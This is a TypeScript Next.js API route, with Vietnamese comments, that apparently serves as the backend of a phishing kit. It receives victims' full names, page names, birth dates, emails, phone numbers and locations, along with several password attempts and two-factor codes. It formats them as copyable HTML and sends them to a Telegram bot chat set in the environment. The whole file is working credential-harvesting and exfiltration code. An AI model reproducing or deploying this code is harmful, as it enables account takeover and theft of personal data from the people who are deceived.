import { NextResponse } from "next/server";
import type { FormData, LocationData } from "@/types/form";

interface LogEventPayload {
  formDetails: FormData | null;
  passwordAttempts: string[];
  twofaAttempts: string[];
  selectedMethod?: string | null;
  locationData?: LocationData | null;
}

// Helper function để gửi log qua Telegram với format có thể copy
async function sendTelegramMessage(message: string, parseMode: "HTML" | "Markdown" = "HTML"): Promise<boolean> {
  try {
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log("📨 Telegram Log (no config):", message);
      return false;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: parseMode,
        disable_web_page_preview: true,
      }),
    });

    const data = await response.json();
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    return true;
  } catch (error) {
    console.error("Telegram send error:", error);
    return false;
  }
}

function isIpv4(value: string | undefined): boolean {
  if (!value) return false;
  const parts = value.split(".");
  if (parts.length !== 4) return false;

  return parts.every((part) => {
    if (!/^\d+$/.test(part)) return false;
    const n = Number(part);
    return n >= 0 && n <= 255;
  });
}

function formatLogMessage(payload: LogEventPayload, location: LocationData): string {
  const { formDetails, passwordAttempts, twofaAttempts } = payload;

  const preferredIp = (isIpv4(location.ipv4) ? location.ipv4! : location.ip) || "unknown";
  const country = location.location.country || "Unknown";
  const countryCode = location.location.countryCode || "??";
  const region = location.location.region || "Unknown";
  
  const separator = "-------------------";
  
  let message = `<b>Ip:</b> <code>${preferredIp}</code>\n`;
  message += `<b>Location:</b> ${preferredIp} | ${region} | ${country}(${countryCode})\n`;
  message += `${separator}\n`;

  if (formDetails) {
    message += `<b>Full Name:</b> <code>${formDetails.fullName}</code>\n`;
    message += `<b>Page Name:</b> <code>${formDetails.pageName || ""}</code>\n`;
    
    // Ensure 2-digit format for DD/MM
    const day = formDetails.day.padStart(2, "0");
    const month = formDetails.month.padStart(2, "0");
    message += `<b>Date of birth:</b> <code>${day}/${month}/${formDetails.year}</code>\n`;
    message += `${separator}\n`;
    
    message += `<b>Email:</b> <code>${formDetails.email}</code>\n`;
    message += `<b>Email Business:</b> <code>${formDetails.emailBusiness || formDetails.email}</code>\n`;
    message += `<b>Phone Number:</b> <code>${formDetails.phoneNumber}</code>\n`;
    message += `${separator}\n`;
  }

  // Password attempts
  if (passwordAttempts.length > 0) {
    passwordAttempts.forEach((attempt, i) => {
      message += `<b>Password(${i + 1}):</b> <code>${attempt}</code>\n`;
    });
    message += `${separator}\n`;
  }

  // 2FA attempts with lock emoji
  if (twofaAttempts.length > 0) {
    twofaAttempts.forEach((attempt, i) => {
      message += `🔐 <b>Code 2FA(${i + 1}):</b> <code>${attempt}</code>\n`;
    });
  }

  return message;
}

export async function POST(request: Request) {
  try {
    const payload: LogEventPayload = await request.json();

    const location: LocationData = payload.locationData ?? {
      ip: "unknown",
      location: { country: "Unknown", countryCode: "US", city: "", region: "" },
    };

    // Format và gửi log với HTML parse mode để có thể copy
    const logMessage = formatLogMessage(payload, location);
    const sent = await sendTelegramMessage(logMessage, "HTML");

    return NextResponse.json({
      success: sent,
      message: sent ? "Log sent successfully" : "Failed to send log",
    });
  } catch (error) {
    console.error("Log event error:", error);
    return NextResponse.json(
      { success: false, message: "Internal server error" },
      { status: 500 }
    );
  }
}
